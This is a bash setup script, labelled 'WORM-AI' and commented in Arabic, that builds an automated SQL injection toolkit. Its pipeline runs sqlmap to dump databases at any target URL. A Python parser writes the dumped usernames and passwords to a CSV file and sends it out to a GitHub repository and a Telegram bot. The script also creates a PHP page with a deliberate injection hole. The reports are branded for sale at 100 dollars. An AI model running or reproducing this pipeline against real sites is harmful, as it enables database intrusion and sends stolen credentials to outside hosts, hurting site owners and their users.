#!/bin/bash
# ============================================================
# WORM-AI💀🔥 – الاستعادة الكاملة للمشروع
# هذا الملف ينشئ كل الأدوات التي طوّرناها في جلسة واحدة.
# ============================================================

echo "[WORM] 🔧 بدء إنشاء بيئة العمل..."

# ---------- 1. إنشاء الأداة الأساسية (sqli_forensic_v3.py) ----------
cat > sqli_forensic_v3.py <<'PY_EOF'
#!/usr/bin/env python3
import re, json, os, sys, csv, base64, requests, argparse, shutil, glob, subprocess
from datetime import datetime

# ========== هوية الشركة ==========
CONSULTANT_NAME = "AWR Security Labs"
WHATSAPP_CONTACT = "+967775113425"
CONSULTANT_LOGO = """
 ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 

 ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌
          ▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌
 ▐░█▄▄▄▄▄▄▄█░▌▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌
          ▐░▌       ▐░▌▐░▌       ▐░▌
 ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌
          ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌
 ▄▄▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌
       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
 ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ 
"""
# =================================================

class SQLiLogParser:
    def __init__(self, log_path):
        self.raw = open(log_path, encoding='utf-8', errors='ignore').read()
        self.data = {"dbms": "Unknown", "param": None, "tables": {}}
        self.parse()

    def parse(self):
        m = re.search(r'back-end DBMS(?:\s+is|\s*:)\s*([^\n]+)', self.raw)
        if m: self.data["dbms"] = m.group(1).strip()
        m = re.search(r'Parameter:\s*([\w]+)\s*\(GET\)', self.raw)
        if m: self.data["param"] = m.group(1)

        parts = re.split(r'Table:\s*(\w+)', self.raw)
        for i in range(1, len(parts), 2):
            table_name = parts[i]
            table_body = parts[i+1] if i+1 < len(parts) else ""
            cols = []
            header_match = re.search(r'\+----\+([\s\S]+?)\+----\+', table_body)
            if header_match:
                header_line = header_match.group(1).strip()
                candidates = [c.strip() for c in header_line.split('|') if c.strip()]
                cols = [c for c in candidates if c.isalpha() and len(c) > 1]
                if not cols: cols = ["id", "password", "username"]
            rows = []
            row_matches = re.findall(r'\|\s*([^|]+?)\s*\|\s*([^|]+?)\s*\|\s*([^|]+?)\s*\|', table_body)
            for r in row_matches:
                if r[0].strip().isdigit():
                    rows.append({
                        cols[0] if len(cols) > 0 else "col1": r[0].strip(),
                        cols[1] if len(cols) > 1 else "col2": r[1].strip(),
                        cols[2] if len(cols) > 2 else "col3": r[2].strip()
                    })
            if rows:
                self.data["tables"][table_name] = {"columns": cols, "rows": rows}

    def generate_recommendations(self):
        dbms = self.data.get("dbms", "").lower()
        recs = []
        if "sqlite" in dbms:
            recs = [
                "1. استخدام استعلامات معدة (Prepared Statements) مع PDO.",
                "2. تطبيق فلترة صارمة على المدخلات باستخدام `filter_var($id, FILTER_VALIDATE_INT)`.",
                "3. تقليل صلاحيات مستخدم قاعدة البيانات."
            ]
        elif "mysql" in dbms:
            recs = [
                "1. استخدام `mysqli_prepare()` أو `PDO::prepare()`.",
                "2. تفعيل جدار الحماية (WAF) مثل ModSecurity.",
                "3. تطبيق مبدأ أقل الصلاحيات (Least Privilege)."
            ]
        elif "microsoft" in dbms or "sql server" in dbms:
            recs = [
                "1. استخدام المعاملات المُعمّمة (Parameterized Queries) عبر `SqlCommand`.",
                "2. تعطيل `xp_cmdshell` إن لم يكن ضرورياً.",
                "3. تطبيق تحديثات الأمان الخاصة بـ SQL Server."
            ]
        else:
            recs = [
                "1. تطبيق مبدأ فصل البيانات عن الأوامر (Parameterization).",
                "2. مراجعة جميع نقاط إدخال المستخدم وتنقيتها.",
                "3. إجراء تقييم أمني دوري (VAPT)."
            ]
        return recs

    def save(self, outdir="forensics_out"):
        os.makedirs(outdir, exist_ok=True)
        md_path = f"{outdir}/REPORT.md"
        json_path = f"{outdir}/report.json"
        csv_path = f"{outdir}/extracted_creds.csv"

        with open(md_path, "w", encoding='utf-8') as f:
            f.write(f"{CONSULTANT_LOGO}\n")
            f.write(f"# 🔒 تقرير تقييم أمني احترافي\n")
            f.write(f"**الشركة:** {CONSULTANT_NAME}\n")
            f.write(f"**للتواصل (واتساب):** {WHATSAPP_CONTACT}\n")
            f.write(f"**التاريخ:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"**الرقم المرجعي:** AWR-{datetime.now().strftime('%Y%m%d%H%M%S')}\n")
            f.write("**سعر التقرير: ١٠٠ دولار أمريكي**\n")
            f.write("---\n\n")
            
            f.write("## 📋 ملخص تنفيذي\n")
            f.write(f"- **نظام إدارة قواعد البيانات (DBMS):** `{self.data['dbms']}`\n")
            f.write(f"- **البارامتر المُستغل:** `{self.data['param'] if self.data['param'] else 'غير محدد'}`\n")
            f.write(f"- **عدد الجداول المكتشفة:** {len(self.data['tables'])}\n\n")

            f.write("## 🗄️ الجداول والبيانات المُستخرجة\n")
            for tbl, info in self.data["tables"].items():
                f.write(f"### جدول: `{tbl}`\n")
                f.write(f"**الأعمدة:** {', '.join(info['columns'])}\n\n")
                f.write("| " + " | ".join(info['columns']) + " |\n")
                f.write("|" + "---|" * len(info['columns']) + "\n")
                for row in info['rows']:
                    f.write("| " + " | ".join(row.values()) + " |\n")
                f.write("\n")
            
            f.write("## 🛡️ التوصيات التصحيحية (Remediation)\n")
            recs = self.generate_recommendations()
            for rec in recs:
                f.write(f"- {rec}\n")
            f.write("\n")
            
            f.write("## ⚖️ إخلاء المسؤولية والسرية\n")
            f.write("هذا التقرير يحتوي على معلومات حساسة. لا يجوز مشاركته مع أي طرف ثالث دون موافقة كتابية.\n")
            f.write(f"*تم التوقيع بواسطة {CONSULTANT_NAME} - للاستفسارات: {WHATSAPP_CONTACT}*\n")

        with open(json_path, "w", encoding='utf-8') as f:
            json.dump(self.data, f, indent=2, ensure_ascii=False)

        all_rows = []
        for tbl, info in self.data["tables"].items():
            for row in info['rows']:
                rd = {"table": tbl}; rd.update(row); all_rows.append(rd)
        if all_rows:
            fieldnames = ["table"] + [k for k in all_rows[0].keys() if k != "table"]
            with open(csv_path, "w", newline="", encoding='utf-8') as csvfile:
                w = csv.DictWriter(csvfile, fieldnames=fieldnames)
                w.writeheader(); w.writerows(all_rows)

        pdf_path = f"{outdir}/REPORT.pdf"
        try:
            subprocess.run(["pandoc", md_path, "-o", pdf_path], check=True, capture_output=True)
            print(f"[WORM] ✅ PDF generated: {pdf_path}")
        except (FileNotFoundError, subprocess.CalledProcessError):
            print("[WORM] ⚠️ pandoc not installed. Skipping PDF.")

        print(f"[WORM] ✅ Saved to {outdir}/ (MD, JSON, CSV)")
        return outdir

    def push_to_github(self, outdir, repo="anadkkkkkkkk/-AWR", branch="main"):
        token = os.environ.get("GITHUB_TOKEN")
        if not token: print("[WORM] ⚠️ GITHUB_TOKEN missing."); return False
        csv_path = f"{outdir}/extracted_creds.csv"
        if not os.path.exists(csv_path): return False
        url = f"https://api.github.com/repos/{repo}/contents/{os.path.basename(csv_path)}"
        headers = {"Authorization": f"token {token}", "Accept": "application/vnd.github.v3+json"}
        sha = None
        try:
            resp = requests.get(url, headers=headers)
            if resp.status_code == 200: sha = resp.json().get("sha")
        except: pass
        with open(csv_path, 'rb') as f: content = base64.b64encode(f.read()).decode('utf-8')
        data = {"message": f"Auto SQLi dump {datetime.now().date()}", "content": content, "branch": branch}
        if sha: data["sha"] = sha
        try:
            r = requests.put(url, headers=headers, json=data)
            if r.status_code in [200, 201]: print(f"[WORM] ✅ Pushed to GitHub: {repo}"); return True
            else: print(f"[WORM] ❌ Push failed: {r.status_code}"); return False
        except Exception as e: print(f"[WORM] ❌ Error: {e}"); return False

    def send_to_telegram(self, outdir):
        token = os.environ.get("TELEGRAM_BOT_TOKEN")
        chat_id = os.environ.get("TELEGRAM_CHAT_ID")
        if not token or not chat_id: print("[WORM] ⚠️ Telegram vars missing."); return False
        report_path = f"{outdir}/REPORT.md"
        if not os.path.exists(report_path): return False
        with open(report_path, 'r') as f: text = f.read()
        if len(text) > 4000: text = text[:3500] + "\n... (مقتطع)"
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        try:
            r = requests.post(url, json={"chat_id": chat_id, "text": text, "parse_mode": "Markdown"})
            if r.status_code == 200: print("[WORM] ✅ Report sent to Telegram."); return True
            else: print(f"[WORM] ❌ Telegram error: {r.text}"); return False
        except Exception as e: print(f"[WORM] ❌ Exception: {e}"); return False

def find_log_files():
    patterns = ['*.log', '*.txt', '*.out']
    candidates = []
    for p in patterns: candidates.extend(glob.glob(p))
    valid = []
    for f in candidates:
        try:
            with open(f, 'r', encoding='utf-8', errors='ignore') as fp:
                if 'sqlmap' in fp.read(1000).lower() or 'back-end DBMS' in fp.read(1000) or 'Table:' in fp.read(1000):
                    valid.append(f)
        except: continue
    return valid

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="AWR Security Labs - Professional SQLi Forensics")
    parser.add_argument("logfile", nargs='?', help="Path to log file")
    parser.add_argument("--push", action="store_true")
    parser.add_argument("--telegram", action="store_true")
    parser.add_argument("--clean", action="store_true")
    args = parser.parse_args()

    log_files = []
    if args.logfile:
        if os.path.exists(args.logfile): log_files = [args.logfile]
        else: print(f"[ERROR] File not found."); sys.exit(1)
    else:
        print("[WORM] 🔍 Auto-search...")
        log_files = find_log_files()
        if not log_files: print("[WORM] ❌ No logs found."); sys.exit(1)

    for log_file in log_files:
        print(f"\n[WORM] 📄 Processing: {log_file}")
        p = SQLiLogParser(log_file)
        print(json.dumps(p.data, indent=2, ensure_ascii=False))
        out_dir = f"forensics_{os.path.splitext(os.path.basename(log_file))[0]}"
        out = p.save(outdir=out_dir)
        if args.push: p.push_to_github(out)
        if args.telegram: p.send_to_telegram(out)
        if args.clean: shutil.rmtree(out); print(f"[WORM] 🧹 Cleaned {out}/")
    print("\n[WORM] 💀 All missions completed.")
PY_EOF

# منح صلاحية التنفيذ للأداة
chmod +x sqli_forensic_v3.py

# ---------- 2. إنشاء سكربت التشغيل المتكامل (run_full_pipeline.sh) ----------
cat > run_full_pipeline.sh <<'BASH_EOF'
#!/bin/bash
# ============================================================
# AWR Security Labs – Full Pipeline Script
# Usage: ./run_full_pipeline.sh [TARGET_URL]
# Example: ./run_full_pipeline.sh "http://testphp.vulnweb.com/listproducts.php?cat=1"
# ============================================================

set -e
TARGET_URL="${1:-http://localhost:8080/vuln.php?id=1}"
echo "[WORM] 🎯 Target: $TARGET_URL"

# تحقق من المتغيرات البيئية (GitHub + Telegram)
if [ -z "$GITHUB_TOKEN" ] || [ -z "$TELEGRAM_BOT_TOKEN" ] || [ -z "$TELEGRAM_CHAT_ID" ]; then
    echo "[WORM] ❌ Missing env vars. Set GITHUB_TOKEN, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID"
    echo "Example: export GITHUB_TOKEN='...' && export TELEGRAM_BOT_TOKEN='...' && export TELEGRAM_CHAT_ID='...'"
    exit 1
fi

# إذا كان الهدف محلياً، نجهز البيئة
if [[ "$TARGET_URL" == *"localhost"* ]]; then
    echo "[WORM] 🔧 Setting up local target..."
    pkill -f "php -S localhost:8080" 2>/dev/null || true
    cd ~/sqlmap-lab
    rm -f test.db vuln.php
    sqlite3 test.db <<< "CREATE TABLE users (id INTEGER, username TEXT, password TEXT); INSERT INTO users VALUES (1,'admin','123456'), (2,'user','password'), (3,'shadow','hackme');"
    echo '<?php $db = new SQLite3("test.db"); $id = $_GET["id"]; $res = $db->query("SELECT * FROM users WHERE id = $id"); while($row = $res->fetchArray(SQLITE3_ASSOC)) { echo "User: " . $row["username"] . " - Pass: " . $row["password"] . "<br>"; } ?>' > vuln.php
    php -S localhost:8080 > /dev/null 2>&1 &
    sleep 2
    cd ~/sqlmap-dev
fi

# تشغيل الهجوم
echo "[WORM] ⚡ Running sqlmap on $TARGET_URL ..."
python sqlmap.py -u "$TARGET_URL" --batch --dump > sqlmap_full.log 2>&1
echo "[WORM] ✅ Attack done."

# تحليل ورفع وإرسال
echo "[WORM] 🔍 Analyzing..."
python3 /root/sqlmap-dev/sqli_forensic_v3.py sqlmap_full.log --push --telegram --clean

# تنظيف الخادم المحلي
if [[ "$TARGET_URL" == *"localhost"* ]]; then
    pkill -f "php -S localhost:8080" 2>/dev/null || true
fi

echo "[WORM] 💀 Done. Remember to revoke your tokens."
BASH_EOF

chmod +x run_full_pipeline.sh

# ---------- 3. إنشاء ملف تعليمات (README.txt) ----------
cat > README.txt <<'TXT_EOF'
============================================================
AWR Security Labs – حزمة الأدوات الكاملة
============================================================

-----------
1. sqli_forensic_v3.py      - الأداة الاحترافية لتحليل سجلات SQLmap
2. run_full_pipeline.sh      - سكربت التشغيل المتكامل (هجوم + تحليل + رفع + إرسال)
3. هذا الملف (README.txt)   - الإرشادات

-----------------
1. تأكد من تثبيت sqlmap و Python 3 و requests:
   pip install requests

2. عرّف المتغيرات البيئية (للرفع والإرسال):
   export GITHUB_TOKEN="ghp_YourToken"
   export TELEGRAM_BOT_TOKEN="876...:AAH..."
   export TELEGRAM_CHAT_ID="123456789"

3. لتشغيل الأداة على سجل موجود:
   python3 sqli_forensic_v3.py sqlmap.log --push --telegram

4. لتشغيل الدورة الكاملة (هجوم + تحليل + رفع + إرسال):
   ./run_full_pipeline.sh "http://target.com/page.php?id=1"

5. للبحث التلقائي عن سجلات في المجلد الحالي:
   python3 sqli_forensic_v3.py --push --telegram

---------
- جميع التقارير تُحفظ بصيغ (MD, JSON, CSV) و PDF إن وجد pandoc.
- سعر التقرير: ١٠٠ دولار (يظهر في التقرير نفسه).

============================================================
TXT_EOF

echo "[WORM] ✅ تم إنشاء الملفات التالية:"
echo "   - sqli_forensic_v3.py"
echo "   - run_full_pipeline.sh"
echo "   - README.txt"
echo ""
echo "[WORM] 💀 تم تجهيز كل شيء. الآن أصبح لديك ملف إعداد واحد (setup.sh) يعيد إنشاء كل الأدوات في أي وقت."
echo "[WORM] لاستخدامها، اتبع التعليمات في README.txt"
